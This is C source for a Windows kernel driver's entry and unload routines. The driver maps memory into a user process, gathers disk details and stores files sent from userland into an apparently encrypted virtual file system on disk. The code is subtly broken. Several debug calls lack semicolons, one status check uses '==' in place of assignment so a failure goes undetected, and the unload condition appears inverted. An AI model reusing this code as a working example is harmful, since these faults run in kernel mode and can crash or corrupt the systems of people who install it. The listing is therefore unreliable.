#include "main.h"
#include "comm.h"
#include "disk.h"
#include "rc4.h"
#include "rc6.h"
#include "vfs.h"
#include "linked_list.h"

NTSTATUS DriverEntry(__in PDRIVER_OBJECT pDriverObject, 
					 __in PUNICODE_STRING pRegistryPath)
{	
	NTSTATUS status;
	UNICODE_STRING usDeviceName;
	PDEVICE_OBJECT pDeviceObject = NULL;
	PVOID object;
	HANDLE hThread;
	LARGE_INTEGER li1;
	ULONG i;
	WCHAR diskpath[20];
	DWORD n = 0;
	nb_entries = 0;
	bFinish = FALSE;
	
	RtlInitUnicodeString(&usDeviceName, DEVICE_NAME); 
	if(!NT_SUCCESS(status = IoCreateDevice(pDriverObject, 0, &usDeviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject)))
		return status;

	pDeviceObject->Flags |= DO_BUFFERED_IO;
	pDeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);
	
	KeQueryTickCount(&li1);
	g_seed = li1.HighPart;
	
	if(!NT_SUCCESS(status = Comm_InitUserlandThread(diskpath)))
		return status;
	Dbg("[+] Diskpath : %ws\n", diskpath);
	
	
	if(!NT_SUCCESS(status = Comm_InitMDL()))
		return status;
	Dbg("[+] MDL mapped in user process\n");
	
	if(!NT_SUCCESS(status = DISK_CollectDriveInfo(diskpath)))
		return status;
	Dbg("[+] Disk infos collected\n");
		
	if(!NT_SUCCESS(status = VFS_Store_DiskInfo()))
	{
		Dbg("status : %x\n", status);
		return status;
	}
	Dbg("[+] DiskInfo stored on the disk\n")
		
	
	status = PsCreateSystemThread(&hThread, GENERIC_ALL, NULL, NULL, NULL, (PKSTART_ROUTINE)Comm_AccessMdl, wrap_MDL_WaitFinishEvent);
	if(!NT_SUCCESS(status))
		return status;
	
	// first we get all the files to store from the userland process
	while(!bFinish)
	{
		if(!NT_SUCCESS(status = Comm_AccessMdl(wrap_MDL_SetEvent)))
			return status;
		Dbg("Wait to receive file to store...\n");
		if(!NT_SUCCESS(status = Comm_AccessMdl(wrap_MDL_WaitEvent)))
			return status;
		if(!NT_SUCCESS(status = Comm_AccessMdl(wrap_MDL_ResetEvent)))
			return status;
		Dbg("[+] File received from user process !\n");
		if(!NT_SUCCESS(status == Comm_AccessMdl(wrap_MDL_DumpStructure)))
			return status;
		Dbg("[+] File added to linked list")
		nb_entries++;
		if(!NT_SUCCESS(status = Comm_AccessMdl(wrap_MDL_ResetUserEvent)))
			return status;
		Dbg("[+] Container stored in memory");
	}
	
	if(!NT_SUCCESS(status = Comm_AccessMdl(wrap_MDL_SetFinishEvent)))
		return status;
	
	Dbg("before VFS_StoreData\n");
		
	if(!NT_SUCCESS(status = VFS_StoreData()))
		return status;
	
	Dbg("[+] All files have been stored in the VFS");
	
	pDriverObject->DriverUnload = Unload;

	return STATUS_SUCCESS;
}

VOID Unload(__in PDRIVER_OBJECT pDriverObject)
{
	try {
		if(!addrMdl)
		{
			MmUnlockPages(pMdl);
			IoFreeMdl(pMdl);
		}
	} except (EXCEPTION_EXECUTE_HANDLER) {}
	IoDeleteDevice(pDriverObject->DeviceObject);
}
